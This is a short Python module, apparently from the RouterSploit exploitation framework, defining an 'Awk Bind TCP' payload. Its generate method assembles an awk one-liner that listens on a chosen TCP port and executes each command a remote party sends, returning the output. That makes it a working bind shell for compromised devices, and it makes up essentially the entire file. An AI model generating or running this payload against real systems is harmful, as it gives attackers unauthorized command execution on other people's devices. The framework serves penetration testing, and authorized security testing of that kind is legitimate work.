from routersploit import exploits
from routersploit.payloads import BindTCPPayloadMixin, GenericPayload


class Exploit(BindTCPPayloadMixin, GenericPayload):
    __info__ = {
        'name': 'Awk Bind TCP',
        'authors': [
        ],
        'description': '',
        'references': [
        ],
        'devices': [
        ],
    }

    awk_binary = exploits.Option('awk', 'Awk binary')

    def generate(self):
        return (
            self.awk_binary
            + " 'BEGIN{s=\"/inet/tcp/"
            + str(self.rport)
            + "/0/0\";for(;s|&getline c;close(c))"
              "while(c|getline)print|&s;close(s)}'"
        )
